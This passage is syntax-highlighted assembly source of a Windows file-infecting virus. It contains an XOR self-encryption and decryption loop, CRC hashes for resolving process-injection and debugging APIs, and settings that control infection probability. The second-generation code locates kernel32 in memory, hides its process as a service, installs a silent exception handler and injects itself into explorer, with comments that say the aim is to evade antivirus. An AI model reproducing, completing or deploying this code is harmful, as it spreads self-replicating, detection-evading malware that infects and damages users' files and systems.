</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">ECode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">Cryptit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Cryptit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">auxi</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">DkRyPtIt_</span><span class="sc0">
</span><span class="sc5">DkRyPtIt_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DkRyPtIt_</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">GoGoGo_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GoGoGo_</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">MyEntryPoint</span><span class="sc0">

</span><span class="sc1">;^^^^^^^^^^^^^^^^^^^FIRST GENERATION CODE</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;vvvvvvvvvvvvvvvvvvvSECOND GENERATION</span><span class="sc0">

</span><span class="sc5">SVirus</span><span class="sc4">:</span><span class="sc0"> 


</span><span class="sc1">;APIS NAMES CRCS AND LENGHTS</span><span class="sc0">

</span><span class="sc5">LoadLibraryACRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3fc1bd8dh</span><span class="sc0">
</span><span class="sc5">LLNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">CloseHandleCRC</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0b09315f4h</span><span class="sc0">
</span><span class="sc5">CHNameLen</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">FindFirstFileACRC</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c9ebd5ceh</span><span class="sc0">
</span><span class="sc5">FFFNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">FindNextFileACRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">75272948h</span><span class="sc0">
</span><span class="sc5">FNFNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">FindCloseCRC</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d82bf69ah</span><span class="sc0">
</span><span class="sc5">FCNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">GetTickCountCRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5b4219f8h</span><span class="sc0">
</span><span class="sc5">GTCNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">WriteMemoryProcessCRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4f58972eh</span><span class="sc0">
</span><span class="sc5">WMPNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">ReadMemoryProcessCRC</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f7c7ae42h</span><span class="sc0">
</span><span class="sc5">RMPNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">ResumeThreadCRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3872beb9h</span><span class="sc0">
</span><span class="sc5">RTNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">ExitProcessCRC</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">251097CCh</span><span class="sc0">
</span><span class="sc5">EPNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">SetFileAttributesACRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">156b9702h</span><span class="sc0">
</span><span class="sc5">SFANameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">CreateFileACRC</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">553b5c78h</span><span class="sc0">
</span><span class="sc5">CFNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">CreateFileMappingACRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0b41b926ch</span><span class="sc0">
</span><span class="sc5">CFMNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">MapViewOfFileCRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0A89b382fh</span><span class="sc0">
</span><span class="sc5">MVFNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFileCRC</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">391ab6afh</span><span class="sc0">
</span><span class="sc5">UVFNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">SetFileTimeCRC</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21804a03h</span><span class="sc0">
</span><span class="sc5">SFTNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">GetModuleHandleACRC</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0B1866570h</span><span class="sc0">
</span><span class="sc5">GMHNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">GetLastErrorCRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d2e536b7h</span><span class="sc0">
</span><span class="sc5">GLENameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">RegisterServiceProcessCRC</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3b5ef61fh</span><span class="sc0">
</span><span class="sc5">RSPNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryACRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">69b6849fh</span><span class="sc0">
</span><span class="sc5">SCDNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryACRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c79dc4e3h</span><span class="sc0">
</span><span class="sc5">GCDNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryACRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0fff372beh</span><span class="sc0">
</span><span class="sc5">GWDNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">GetModuleFileNameACRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08bff7a0h</span><span class="sc0">
</span><span class="sc5">GMFNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">CreateProcessACRC</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0a851d916h</span><span class="sc0">
</span><span class="sc5">CPNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">Module32FirstCRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">38891c00h</span><span class="sc0">
</span><span class="sc5">M32FNameLen</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">Module32NextCRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f6911852h</span><span class="sc0">
</span><span class="sc5">M32NNameLen</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">CreateToolhelp32SnapShotCRC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c1f3b876h</span><span class="sc0">
</span><span class="sc5">CT32SNameLen</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">VirtualProtectExCRC</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5d180413h</span><span class="sc0">
</span><span class="sc5">VPNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">GetCurrentProcessCRC</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d0861aa4h</span><span class="sc0">        
</span><span class="sc5">GCPNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">  
</span><span class="sc5">OpenProcessTokenCRC</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f9c60615h</span><span class="sc0">
</span><span class="sc5">OPTNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">LookupPrivilegeValueACRC</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0da87bf62h</span><span class="sc0">
</span><span class="sc5">LPVNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">AdjustTokenPrivilegesCRC</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0de3e5cfh</span><span class="sc0">
</span><span class="sc5">ATPNameLen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">EnumProcessesCRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0509a21ch</span><span class="sc0">
</span><span class="sc5">EPSNameLen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">EnumProcessModulesCRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0dea82ac2h</span><span class="sc0">
</span><span class="sc5">EPMNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">GetModuleInformationCRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f2a84636h</span><span class="sc0">
</span><span class="sc5">GMINameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">SuspendThreadCRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0bd76ac31h</span><span class="sc0">
</span><span class="sc5">STNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">FreeLibraryCRC</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0da68238fh</span><span class="sc0">
</span><span class="sc5">FLNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">GetVersionCRC</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4ccf1a0fh</span><span class="sc0">
</span><span class="sc5">GVNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">RasDialACRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0b88da156h</span><span class="sc0">
</span><span class="sc5">RDNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">GetModuleBaseNameACRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1720513eh</span><span class="sc0">
</span><span class="sc5">GMBNNameLen</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">OpenProcessCRC</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0df27514bh</span><span class="sc0">
</span><span class="sc5">OPNameLen</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">ZwConnectPortCRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0cbaec255h</span><span class="sc0">
</span><span class="sc5">ZCPNameLen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">NtConnectPortCRC</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c88edce9h</span><span class="sc0">
</span><span class="sc5">NCPNameLen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">ZwRequestPortCRC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0e28aebd1h</span><span class="sc0">
</span><span class="sc5">ZRPNameLen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">DbgUiConnectToDbgCRC</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">09a51ac3ah</span><span class="sc0">
</span><span class="sc5">DUCTDNameLen</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">DbgSsInitializeCRC</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d198b351h</span><span class="sc0">
</span><span class="sc5">DSINameLen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">DbgSsHandleKmApiMsgCRC</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2e9c4e99h</span><span class="sc0">
</span><span class="sc5">DSHKAMNameLen</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">GetCurrentProcessIdCRC</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1db413e3h</span><span class="sc0">
</span><span class="sc5">GCPINameLen</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">GetCurrentThreadIdCRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8df87e63h</span><span class="sc0">
</span><span class="sc5">GCTINameLen</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">WaitForDebugEventCRC</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">96ab83a1h</span><span class="sc0">
</span><span class="sc5">WFDENameLen</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">ContinueDebugEventCRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d8e77e49h</span><span class="sc0">
</span><span class="sc5">CDENameLen</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">VirtualAllocExCRC</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0e62e824dh</span><span class="sc0">
</span><span class="sc5">VANameLen</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">CreateRemoteThreadCRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0ff808c10h</span><span class="sc0">
</span><span class="sc5">CRTNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">NtTerminateProcessCRC</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">94fcb0c0h</span><span class="sc0">
</span><span class="sc5">NTPNameLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">ExitThreadCRC</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80af62e1h</span><span class="sc0">
</span><span class="sc5">ETNameLen</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryWCRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">334971b2h</span><span class="sc0">
</span><span class="sc5">GCDWNameLen</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">FindFirstFileWCRC</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3d3f609fh</span><span class="sc0">
</span><span class="sc5">FFFWNameLen</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">SleepCRC</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0CEF2EDA8h</span><span class="sc0">
</span><span class="sc5">SNameLen</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">



</span><span class="sc5">Kernel32CRC</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">204c64e5h</span><span class="sc0"> </span><span class="sc1">;CRC of 'kernel32' string</span><span class="sc0">


</span><span class="sc5">ERROR_NO_MORE_FILES</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">MEM_COMMIT</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">MEM_RESERVE</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00002000h</span><span class="sc0">
</span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">
</span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">CREATE_SUSPENDED</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">DEBUG_PROCESS</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CREATE_NEW_PROCESS_GROUP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">

</span><span class="sc5">TH32CS_SNAPMODULE</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">SNAPSHOT</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">;config constants</span><span class="sc0">
</span><span class="sc5">MAX_DEPTH</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;min depth,for now</span><span class="sc0">
</span><span class="sc5">INFECTION_PROBABILITY</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;values 0 - 7...if value &gt; 7 always infects.If 0 never.</span><span class="sc0">
</span><span class="sc5">PER_PROCESS_PROBABILITY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;values 0 - 7...if value &gt; 7 never infects with per-process</span><span class="sc0">
                         </span><span class="sc1">;characteristic.If 0 always with per-process.</span><span class="sc0">
</span><span class="sc5">WORK_IN_NT</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;if WORK_IN_NT == 1,virus works in NT and try to do </span><span class="sc0">
                         </span><span class="sc1">;some specifics things for NT.If 0,virus exits if NT.</span><span class="sc0">


</span><span class="sc5">SCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;when we infect in memory the explorer process injecting our code the execution begins here</span><span class="sc0">

            </span><span class="sc1">;This code is encrypted with random key each 4 bytes</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">d_offsetz</span><span class="sc0">   </span><span class="sc1">;first byte is E8000000h when uncrypted</span><span class="sc0">
</span><span class="sc5">d_offsetz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">d_offsetz</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">  
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc1">;eax -&gt; a part of kernel32</span><span class="sc0">
</span><span class="sc5">SearchKernelz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchKernelz</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;we set our process as service process.</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RegisterServiceProcessCRC</span><span class="sc4">,</span><span class="sc5">RSPNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;we will setup a SEH frame and if a error occurs nobody know it :D</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerEnd</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">             
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">      </span><span class="sc1">;we set the SEH frame</span><span class="sc0">
                </span><span class="sc1">;note its not necessary our handler </span><span class="sc0">
                        </span><span class="sc1">;restore SEH becoz we will terminate</span><span class="sc0">
                </span><span class="sc1">;the process </span><span class="sc0">

</span><span class="sc1">;we repeat the process of injection of code in explorer MAX_DEPTH times.When we have loaded</span><span class="sc0">
</span><span class="sc1">;and infected explorer at MAX_DEPTH time then it's executed file infection zone.</span><span class="sc0">
</span><span class="sc1">;I think it will be more difficult for avs with this trap.</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerDepth</span><span class="sc4">],</span><span class="sc5">MAX_DEPTH</span><span class="sc0">
